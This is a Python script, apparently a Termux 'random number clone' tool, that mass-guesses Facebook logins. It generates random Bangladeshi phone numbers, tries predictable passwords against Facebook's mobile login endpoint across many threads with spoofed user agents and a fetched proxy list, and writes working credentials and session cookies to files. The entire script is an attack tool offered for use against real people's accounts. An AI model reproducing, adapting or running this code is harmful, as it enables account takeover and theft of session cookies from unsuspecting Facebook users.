

import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    os.system('pkg install espeak')

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' 

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' 

M = '\x1b[1;91m' 

H = '\x1b[1;92m' 

K = '\x1b[1;93m' 

B = '\x1b[1;94m' 

U = '\x1b[1;95m' 

O = '\x1b[1;96m' 

N = '\x1b[0m'    

A = '\x1b[1;90m' 

BN = '\x1b[1;107m' 

BBL = '\x1b[1;106m' 

BP = '\x1b[1;105m' 

BB = '\x1b[1;104m' 

BK = '\x1b[1;103m' 

BH = '\x1b[1;102m' 

BM = '\x1b[1;101m' 

BA = '\x1b[1;100m' 

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://github.com/rakibcy/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android 11;'

    b=random.choice(['6','7','8','9','10','11','12'])

    c='fr-fr; Redmi Note 11 Build/'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn

#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36

    aa='Mozilla/5.0 (Linux; Android 13;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    

    aa='Mozilla/5.0 (Linux; Android 10;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

    aa='Mozilla/5.0 (Linux; Android 12;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

	

    aa='Mozilla/5.0 (Linux; Android 11;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    aa='Mozilla/5.0 (Linux; Android 9;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

os.system('xdg-open https://github.com/SF-RAKIB ')



logo = ("""
      
\033[38;5;46m########     ###    ##    ## #### ########     
\033[38;5;46m##     ##   ## ##   ##   ##   ##  ##     ##    
\033[38;5;46m##     ##  ##   ##  ##  ##    ##  ##     ##    
\033[38;5;46m########  ##     ## #####     ##  ########     
\033[38;5;46m##   ##   ######### ##  ##    ##  ##     ##    
\033[38;5;46m##    ##  ##     ## ##   ##   ##  ##     ##    
\033[38;5;46m##     ## ##     ## ##    ## #### ########     

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                RAKIB-CYBER-420 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[+] OWNER   : RAKIB-CYBER-420 
[+] Facebook : Rakib Hossain 
[+] Github   :  rakib-cyber-420
[+] Version  : 0.5
[+] Tool     : Free 
 
""")                                              



class Main:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        print(logo)

        #os.system('espeak -a 200 "Welcome RAKIB project Random Clone"')

        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        print(" [01] RANDOM  NUMBER CLONE ")

        print(" [00] Exit")

        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        Alif =input(" [?] Choose : ")

        #s.system('xdg-open https://www.facebook.com/groups/1632094570493571')

        if Alif in ["1", "01"]:

            num()

        if Alif in [" 0", "00"]:

            exit()

        else:

            exit()

def num():

    user=[]

    os.system('clear')

    print(logo)

    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')

    #s.system('espeak -a 200 "Select your Number"')

    kode = input(' [?] Enter sim code: ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    os.system('clear')

    print(logo)

    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')

    #s.system('espeak -a 200 "select Crack Limit"')

    limit = int(input(' [?] Crack Your Limit : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as noob:

        os.system('clear')

        print(logo)

        #s.system('espeak -a 200 "Random cloning Started RAKIB  Mahmud"')

        tl = str(len(user))

        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        print(' \033[1;97m[+] Total Ids:\033[1;92m '+tl)

        print(' \033[1;97m[+] Process Has Been Started')

        print(' \033[1;97m[+] Wait For ids ')

        print(' \033[1;97m[+] Use Flight [✈️] Mode For Speed Up ')

        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'i love you,Bangladesh']

            noob.submit(rcrack1,uid,pwx,tl)

    print(' [+] Crack process has been completed')

    print(' [+] Ids saved in ok.txt,cp.txt')



def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\033[1;92mRAKIB \033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://m.alpha.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority': 'm.alpha.facebook.com',
            'method': 'GET',
            'path': 'https://m.alpha.facebook.com/?_rdc=1&_rdr',
            'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 		   'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
  		  'cache-control': 'max-age=0',
    		'dpr': '1.8000000715255737',
   		 'sec-ch-prefers-color-scheme': 'light',
 		   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
 		   'sec-ch-ua-mobile': '?1',
  		  'sec-ch-ua-model': '"M2006C3MII"',
   		 'sec-ch-ua-platform': '"Android"',
    		'sec-ch-ua-platform-version': '"10.0.0"',
 		   'sec-fetch-dest': 'document',
    		'sec-fetch-mode': 'navigate',
    		'sec-fetch-site': 'none',
  		  'sec-fetch-user': '?1',
  		  'upgrade-insecure-requests': '1',
  		  'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
  								 'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0'
  								 'Mozilla/5.0 (Linux; Android 12; SM-G975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 Instagram 321.0.0.39.106 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos'
  								 'Mozilla/5.0 (Linux; Android 10; M2006C3MNG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]',}
            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"\033[38;5;46m[RAKIB -OK💉] {uid} | {ps}")

                print(f" Cookie : {coki}Ua = \033[1;34m'+pro+'  \033[0;97m")

                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

            #    print(f"\x1b[38;5;196m[RAKIB -CP🥴] {uid}|{ps}Ua = \033[1;34m'+pro+'  \033[0;97m")

                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\033[m[RAKIB 🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),

        sys.stdout.flush()

    except:

        pass

Main()